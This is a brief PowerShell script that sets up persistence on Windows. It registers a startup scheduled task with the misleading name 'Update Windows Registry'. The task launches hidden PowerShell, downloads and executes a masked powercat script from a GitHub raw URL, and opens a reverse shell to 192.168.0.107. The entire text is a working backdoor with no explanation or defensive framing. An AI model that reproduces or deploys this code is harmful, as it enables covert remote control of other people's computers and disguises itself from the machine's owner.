$trigger = New-ScheduledTaskTrigger -AtStartup
$action = New-ScheduledTaskAction -Execute "powershell -windowstyle hidden -c IEX(IWR https://raw.githubusercontent.com/simeone22/PowercatMasked/main/powercat.ps1 -UseBasicParsing); PtyS 192.168.0.107 87"
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Update Windows Registry"
